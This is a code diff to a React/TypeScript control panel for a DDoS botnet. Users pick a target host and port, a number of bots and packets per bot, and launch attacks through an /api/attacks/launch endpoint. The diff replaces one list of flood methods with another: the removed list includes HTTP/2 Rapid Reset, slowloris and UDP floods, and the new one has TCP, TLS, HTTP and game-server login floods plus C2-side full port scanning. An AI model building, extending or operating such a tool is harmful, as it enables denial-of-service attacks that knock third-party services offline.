@@ -10,17 +10,13 @@ interface Attack {
   bot_ids: string[]; total_packets: number; started_at: string | null;
 }
 
+/* 5 methods — PSPE/TCP/TLS/HTTP/GAME (server scan optional for multi-port) */
 const METHODS = [
-  { id: 'MEGA', desc: 'TCP+TLS connection flood', cat: 'TCP' },
-  { id: 'TLS_EXHAUST', desc: 'TCP+TLS (alias MEGA)', cat: 'TCP' },
-  { id: 'H2RAPID', desc: 'HTTP/2 Rapid Reset (CVE-2023-44487)', cat: 'L7' },
-  { id: 'WSFLOOD', desc: 'WebSocket flood (512 conns)', cat: 'L7' },
-  { id: 'GRAPHQL', desc: 'GraphQL deeply nested query', cat: 'L7' },
-  { id: 'GAME', desc: 'NRO game socket login spam', cat: 'L7' },
-  { id: 'HTTP_PROXY', desc: 'HTTP via proxy (IP rotation)', cat: 'L7' },
-  { id: 'HTTP', desc: 'HTTP keep-alive pool', cat: 'L7' },
-  { id: 'SLOWLORIS', desc: 'Slowloris drip (512 conns)', cat: 'L7' },
-  { id: 'UDP', desc: 'UDP volumetric flood', cat: 'L3/L4' },
+  { id: 'PSPE', desc: 'Port protocol exhaust — multi-port từ C2 scan', cat: 'PORT' },
+  { id: 'TCP', desc: 'TCP connect storm + hold — L4 mọi port', cat: 'TCP' },
+  { id: 'TLS', desc: 'TLS handshake + GET flood — HTTPS', cat: 'TLS' },
+  { id: 'HTTP', desc: 'HTTP/HTTPS pool + slowloris drip', cat: 'HTTP' },
+  { id: 'GAME', desc: 'Socket protocol — game server (NRO)', cat: 'SOCKET' },
 ];
 
 const DEFENSE_LABELS: Record<string, { label: string; color: string }> = {
@@ -36,9 +32,11 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
   const { toast } = useToast();
   const [attacks, setAttacks] = useState<Attack[]>([]);
   const [form, setForm] = useState({
-    target_host: '', target_port: 443, method: 'MEGA', duration_secs: 60,
+    target_host: '', target_port: 443, method: 'PSPE', duration_secs: 60,
     pps_per_bot: 100000, bot_count: 1, mega_mode: false,
     payload: '', proxies: '',
+    scan_ports: false,
+    extra_ports: '',
   });
 
   /** Parse https://domain.com or http://ip:8080 → host + port */
@@ -138,9 +136,11 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
         target_port: port,
         method,
         pps_per_bot: pps,
-        mega_mode: method === 'MEGA',
-        slowloris: method === 'SLOWLORIS',
-        tls_exhaust: method === 'TLS_EXHAUST',
+        mega_mode: method === 'PSPE' || method === 'MEGA',
+        slowloris: false,
+        tls_exhaust: method === 'TLS' || method === 'TLS_EXHAUST',
+        scan_ports: !!form.scan_ports,
+        extra_ports: form.extra_ports || undefined,
       };
       await api.post('/api/attacks/launch', payload);
       toast(`Attack launched → ${form.target_host}:${form.target_port} [${method}]`, 'success');
@@ -396,10 +396,28 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
             <textarea rows={2} placeholder="Leave empty for auto-crafted NRO login packet..." className={`${input} font-mono text-xs`} value={form.payload} onChange={e => setForm(f => ({ ...f, payload: e.target.value }))} />
           </div>
         )}
-        {form.method === 'HTTP_PROXY' && !autoMode && (
-          <div className="mb-4">
-            <label className={label}>Proxy List (optional — auto-fetch if empty)</label>
-            <textarea rows={2} placeholder="Leave empty for auto-fetch free proxies..." className={`${input} font-mono text-xs`} value={form.proxies} onChange={e => setForm(f => ({ ...f, proxies: e.target.value }))} />
+        {(form.method === 'PSPE' || form.method === 'TCP') && (
+          <div className="mb-4 space-y-3">
+            <label className="flex items-center gap-2.5 cursor-pointer select-none">
+              <input
+                type="checkbox"
+                checked={!!form.scan_ports}
+                onChange={e => setForm(f => ({ ...f, scan_ports: e.target.checked }))}
+                className="w-4 h-4 rounded border-[var(--border)] bg-[var(--bg-primary)] text-emerald-500"
+              />
+              <span className="text-xs text-[var(--text-secondary)]">
+                Full port scan 1–65535 trên C2 <span className="text-[var(--text-muted)]">(mặc định: chỉ port đã set)</span>
+              </span>
+            </label>
+            <div>
+              <label className={label}>Extra ports (optional, comma)</label>
+              <input
+                className={input}
+                placeholder="3389,1433,14443"
+                value={form.extra_ports}
+                onChange={e => setForm(f => ({ ...f, extra_ports: e.target.value }))}
+              />
+            </div>
           </div>
         )}
 
